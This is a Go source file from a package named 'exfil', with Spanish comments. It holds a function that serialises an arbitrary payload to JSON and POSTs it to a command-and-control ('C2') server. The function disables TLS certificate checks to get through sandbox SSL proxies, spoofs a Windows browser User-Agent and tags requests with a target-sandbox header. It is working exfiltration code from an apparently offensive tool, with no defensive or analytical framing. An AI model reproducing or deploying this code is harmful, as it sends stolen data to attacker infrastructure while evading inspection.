package exfil

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

// SendPayload envía el payload al servidor C2
func SendPayload(payload interface{}, serverURL string, timeout time.Duration, targetSandbox string) error {
	// Serializar a JSON
	jsonData, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		return fmt.Errorf("error serializando JSON: %w", err)
	}

	// Crear cliente HTTP con timeout
	// Usar InsecureSkipVerify para evitar problemas con proxies SSL de sandboxes
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout: timeout,
		Transport: tr,
	}

	// Crear request
	req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("error creando request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	if targetSandbox != "" {
		req.Header.Set("X-Target-Sandbox", targetSandbox)
	}

	// Enviar request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error enviando POST: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("servidor respondió con código: %d", resp.StatusCode)
	}

	return nil
}
